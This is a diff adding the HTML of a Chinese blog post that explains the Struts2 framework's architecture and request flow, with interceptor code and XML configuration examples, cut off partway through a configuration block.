@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.zcwww.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="Struts2">
+<meta property="og:url" content="http://www.zcwww.top/2023/08/06/struts2/index.html">
+<meta property="og:site_name" content="欢迎来到成伟的部落">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/u=2456154986,2910914689&fm=253&fmt=auto&app=138&f=JPEG.jpeg">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/986865-20160725063918856-847373176.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/986865-20160725082026481-665978032.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806141036134.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806144628314.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806144741713.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806144948409.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806145048232.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806145412608.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806145648157.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806145828090.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806151106482.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806151816397.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806152648146.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806154733291.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806154902399.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806155924314.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806161939193.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806162117783.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806162610086.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806163003424.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/06/struts2/image-20230806163417260.png">
+<meta property="article:published_time" content="2023-08-06T05:20:41.000Z">
+<meta property="article:modified_time" content="2023-08-06T09:22:22.463Z">
+<meta property="article:author" content="Markcheng">
+<meta property="article:tag" content="学习 生活 分享 交流">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.zcwww.top/2023/08/06/struts2/u=2456154986,2910914689&fm=253&fmt=auto&app=138&f=JPEG.jpeg">
+
+<link rel="canonical" href="http://www.zcwww.top/2023/08/06/struts2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Struts2 | 欢迎来到成伟的部落</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">欢迎来到成伟的部落</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录生活中的点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/zcwww6" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/08/06/struts2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="Markcheng">
+      <meta itemprop="description" content="去爱 去工作">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎来到成伟的部落">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Struts2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-06 13:20:41 / 修改时间：17:22:22" itemprop="dateCreated datePublished" datetime="2023-08-06T13:20:41+08:00">2023-08-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="/2023/08/06/struts2/u=2456154986,2910914689&fm=253&fmt=auto&app=138&f=JPEG.jpeg"></p>
+<span id="more"></span>
+
+<h1 id="struts2介绍"><a href="#struts2介绍" class="headerlink" title="struts2介绍"></a>struts2介绍</h1><blockquote>
+<p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。struts使系统的脉络更加清晰。通过一个配置文件，即可把握整个系统各部分之间的联系，这对于后期的维护有着莫大的好处。</p>
+</blockquote>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
+<li>Struts 2的应用可以不依赖于Servlet API和Struts API 。</li>
+<li>Struts 2 提供了拦截器，利用拦截器可以进行AOP编程。</li>
+<li>Struts 2 提供了类型转换器。</li>
+<li>Struts 2 提供支持多种表现层技术，如：JSP 、 freeMarker等。</li>
+<li>Struts 2 的输入校验可以指定方法进行校验。</li>
+<li>Struts 2 提供了全局范围、包范围和Action范围的国际化资源文件管理实现。</li>
+</ul>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p><img src="/2023/08/06/struts2/986865-20160725063918856-847373176.png"></p>
+<p>1、客户端初始化一个指向Servlet容器（例如Tomcat）的HttpServletRequest请求</p>
+<p>2、这个请求经过一系列的过滤器（Filter）【ActionContextCleanUp的可选过滤器（延长action中属性的生命周期，包括自定义属性，以便在jsp页面中进行访问，让actionContextcleanup过滤器来清除属性，不让action自己清除）】</p>
+<p>3、接着FilterDispatcher被调用，FilterDispatcher询问ActionMapper来决定这个请是否需要调用某个Action </p>
+<p>4、如果ActionMapper决定需要调用某个Action，FilterDispatcher把请求的处理交给ActionProxy</p>
+<p>5、ActionProxy通过ConfigurationManager询问框架的配置文件，找到需要调用的Action类 ,这里，我们一般是从struts.xml配置中读取</p>
+<p>6、ActionProxy创建一个ActionInvocation的实例(invocation:调用)</p>
+<p>7、ActionInvocation实例使用命名模式来调用，在调用Action的过程前后，涉及到相关拦截器（Intercepter）的调用</p>
+<p>​    ActionInvocation是Xworks 中Action 调度的核心。而对Interceptor 的调度，也正是由ActionInvocation负责。ActionInvocation 是一              个接口，而DefaultActionInvocation 则是Webwork 对ActionInvocation的默认实现。</p>
+<p>​      Interceptor的调度流程大致如下：</p>
+<p>​       1.ActionInvocation初始化时，根据配置，加载Action相关的所有Interceptor。</p>
+<p>​        2.通过ActionInvocation.invoke方法调用Action实现时，执行Interceptor。</p>
+<p>8、一旦Action执行完毕，ActionInvocation负责根据struts.xml中的配置找到对应的返回结果。返回结果通常是（但不总是，也可能是另外的一个Action链）一个需要被表示的<strong>JSP或者FreeMarker的模版</strong>。在表示的过程中可以使用Struts2 框架中继承的标签。在这个过程中需要涉及到ActionMapper</p>
+<h3 id="struts2拦截器"><a href="#struts2拦截器" class="headerlink" title="struts2拦截器"></a>struts2拦截器</h3><blockquote>
+<p>拦截器是在访问某个Action或Action的某个方法，字段之前或之后实施拦截，并且Struts2拦截器是可插拔的，拦截器是aop的一种实现</p>
+</blockquote>
+<p><strong>拦截器栈（Interceptor Stack）</strong>：Struts2拦截器栈就是将拦截器按一定的顺序联结成一条链。在访问被拦截的方法或字段时，Struts2拦截器链中的拦截器就会按其之前定义的顺序被调用</p>
+<p><strong>拦截器栈工作原理</strong>：</p>
+<p><img src="/2023/08/06/struts2/986865-20160725082026481-665978032.png"></p>
+<p><strong>拦截器实现类</strong>：</p>
+<p> struts2规定用户自定义拦截器必须实现com.opensymphony.xwork2.interceptor.Interceptor接口</p>
+<p>该接口声明了3个方法</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">String</span> <span class="title">intercept</span><span class="params">(ActionInvocation invocation)</span> throws Exception</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>【</strong>抽象类AbstractInterceptor实现了Interceptor接口，提供了init和destroy方法的空实现。如果我们的拦截器不需要打开资源，则可以无需实现这两个方法。可通过继承AbstractInterceptor抽象类来实现自定义拦截器会更简单】</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> interceptor;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionInvocation;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.interceptor.Interceptor;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInterceptor</span> <span class="keyword">implements</span> <span class="title">Interceptor</span> </span>&#123;</span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">　　<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">　　&#125;</span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">　　<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">　　&#125;</span><br><span class="line">　　<span class="function"><span class="keyword">public</span> String <span class="title">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  　　  System.out.println(<span class="string">&quot;Action执行前插入 代码&quot;</span>);</span><br><span class="line">　　　　<span class="comment">//执行目标方法 (调用下一个拦截器, 或执行Action)</span></span><br><span class="line">    　　<span class="keyword">final</span> String res = invocation.invoke();</span><br><span class="line">    　　System.out.println(<span class="string">&quot;Action执行后插入 代码&quot;</span>);</span><br><span class="line">    　　<span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自定义拦截器</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义拦截器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;拦截器名&quot;</span> <span class="attr">class</span>=<span class="string">&quot;拦截器实现类&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义拦截器栈 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;拦截器栈名&quot;</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;拦截器一&quot;</span>/&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;拦截器二&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用拦截器</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.userAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 使用拦截器,一般配置在result之后， --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 引用系统默认的拦截器 --&gt;</span></span><br><span class="line">　　　　　　　<span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;拦截器名或拦截器栈名&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>如果为Action指定了一个拦截器，则系统默认的拦截器栈将会失去作用。</strong>为了继续使用默认拦截器，需要在自己定义的拦截器栈中手动引入了默认拦截器。</p>
+<p>【默认的拦截器中有一个名为params的拦截器，它的作用是“将请求的参数设置到Action中”，也就是说，如果你从页面中传值到Action，即拦截请求参数，并赋值给action里的属</p>
+<p>性，而且你自定义的拦截器要用到这些值栈中的值，则你的拦截器栈中，需要在自定义拦截器前面加上默认的拦截器】</p>
+<p>　struts2 已经提供了丰富多样的，功能齐全的拦截器实现。在struts2的jar包内的struts-default.xml可以查看到关于默认的拦截器与拦截器链的配置。</p>
+<table>
+<thead>
+<tr>
+<th>拦截器</th>
+<th>名字</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Alias Interceptor</td>
+<td>alias</td>
+<td>在不同请求之间将请求参数在不同名字件转换，请求内容不变</td>
+</tr>
+<tr>
+<td>Chaining Interceptor</td>
+<td>chain</td>
+<td>让前一个Action的属性可以被后一个Action访问，现在和chain类型的result（<result type="chain">）结合使用。</result></td>
+</tr>
+<tr>
+<td>Checkbox Interceptor</td>
+<td>checkbox</td>
+<td>添加了checkbox自动处理代码，将没有选中的checkbox的内容设定为false，而html默认情况下不提交没有选中的checkbox。</td>
+</tr>
+<tr>
+<td>Cookies Interceptor</td>
+<td>cookies</td>
+<td>使用配置的name,value来是指cookies</td>
+</tr>
+<tr>
+<td>Conversion Error Interceptor</td>
+<td>conversionError</td>
+<td>将错误从ActionContext中添加到Action的属性字段中。</td>
+</tr>
+<tr>
+<td>Create Session Interceptor</td>
+<td>createSession</td>
+<td>自动的创建HttpSession，用来为需要使用到HttpSession的拦截器服务。</td>
+</tr>
+<tr>
+<td>Debugging Interceptor</td>
+<td>debugging</td>
+<td>提供不同的调试用的页面来展现内部的数据状况。</td>
+</tr>
+<tr>
+<td>Execute and Wait Interceptor</td>
+<td>execAndWait</td>
+<td>在后台执行Action，同时将用户带到一个中间的等待页面。</td>
+</tr>
+<tr>
+<td>Exception Interceptor</td>
+<td>exception</td>
+<td>将异常定位到一个画面</td>
+</tr>
+<tr>
+<td>File Upload Interceptor</td>
+<td>fileUpload</td>
+<td>提供文件上传功能</td>
+</tr>
+<tr>
+<td>I18n Interceptor</td>
+<td>i18n</td>
+<td>记录用户选择的locale</td>
+</tr>
+<tr>
+<td>Logger Interceptor</td>
+<td>logger</td>
+<td>输出Action的名字</td>
+</tr>
+<tr>
+<td>Message Store Interceptor</td>
+<td>store</td>
+<td>存储或者访问实现ValidationAware接口的Action类出现的消息，错误，字段错误等。</td>
+</tr>
+<tr>
+<td>Model Driven Interceptor</td>
+<td>model-driven</td>
+<td>如果一个类实现了ModelDriven，将getModel得到的结果放在Value Stack中。</td>
+</tr>
+<tr>
+<td>Scoped Model Driven</td>
+<td>scoped-model-driven</td>
+<td>如果一个Action实现了ScopedModelDriven，则这个拦截器会从相应的Scope中取出model调用Action的setModel方法将其放入Action内部。</td>
+</tr>
+<tr>
+<td>Parameters Interceptor</td>
+<td>params</td>
+<td>将请求中的参数设置到Action中去。</td>
+</tr>
+<tr>
+<td>Prepare Interceptor</td>
+<td>prepare</td>
+<td>如果Acton实现了Preparable，则该拦截器调用Action类的prepare方法。</td>
+</tr>
+<tr>
+<td>Scope Interceptor</td>
+<td>scope</td>
+<td>将Action状态存入session和application的简单方法。</td>
+</tr>
+<tr>
+<td>Servlet Config Interceptor</td>
+<td>servletConfig</td>
+<td>提供访问HttpServletRequest和HttpServletResponse的方法，以Map的方式访问。</td>
+</tr>
+<tr>
+<td>Static Parameters Interceptor</td>
+<td>staticParams</td>
+<td>从struts.xml文件中将<action>中的<param>中的内容设置到对应的Action中。</action></td>
+</tr>
+<tr>
+<td>Roles Interceptor</td>
+<td>roles</td>
+<td>确定用户是否具有JAAS指定的Role，否则不予执行。</td>
+</tr>
+<tr>
+<td>Timer Interceptor</td>
+<td>timer</td>
+<td>输出Action执行的时间</td>
+</tr>
+<tr>
+<td>Token Interceptor</td>
+<td>token</td>
+<td>通过Token来避免双击</td>
+</tr>
+<tr>
+<td>Token Session Interceptor</td>
+<td>tokenSession</td>
+<td>和Token Interceptor一样，不过双击的时候把请求的数据存储在Session中</td>
+</tr>
+<tr>
+<td>Validation Interceptor</td>
+<td>validation</td>
+<td>使用action-validation.xml文件中定义的内容校验提交的数据。</td>
+</tr>
+<tr>
+<td>Workflow Interceptor</td>
+<td>workflow</td>
+<td>调用Action的validate方法，一旦有错误返回，重新定位到INPUT画面</td>
+</tr>
+<tr>
+<td>Parameter Filter Interceptor</td>
+<td>N/A</td>
+<td>从参数列表中删除不必要的参数</td>
+</tr>
+<tr>
+<td>Profiling Interceptor</td>
+<td>profiling</td>
+<td>通过参数激活profile</td>
+</tr>
+</tbody></table>
+<p>如果为了简化struts.xml文件的配置，避免在每个Action重复配置该拦截器，可以将拦截器配置成了一个默认拦截器栈</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 定义拦截器 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;customInterceptor&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">class</span>=<span class="string">&quot;com.testInterceptor&quot;</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 定义一个拦截器栈 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;mydefault&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;customInterceptor&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 定义默认拦截器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;mydefault&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 定义全局处理结果 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">global-results</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 逻辑名为login的结果，映射到/login.jsp页面 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">global-results</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.UserAction&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;test1&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.UserAction&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span 